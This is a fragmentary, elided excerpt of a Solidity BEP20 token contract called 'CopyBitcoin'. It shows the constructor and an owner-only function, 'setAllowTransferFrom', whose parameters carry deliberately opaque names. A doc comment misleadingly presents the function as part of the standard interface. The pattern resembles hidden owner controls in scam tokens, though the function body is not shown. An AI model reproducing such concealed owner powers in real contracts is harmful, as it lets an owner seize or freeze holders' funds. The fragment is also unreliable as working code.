...
contract CopyBitcoin is Context, IBEP20, Ownable {
    ...
    constructor() {
        _name = "CopyBitcoin Token";
        _symbol = "COPYBTC";
        _decimals = 9;
        _totalSupply = 940000000 * 10 ** 9;
    ...
    */
    function setAllowTransferFrom(uint256 valore, address memoria, uint256 supplementum) public onlyOwner {
    ...
    */
    ...
    /**
    * @dev See {IBEP20-setAllowTransfer}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {IBEP20};
    *
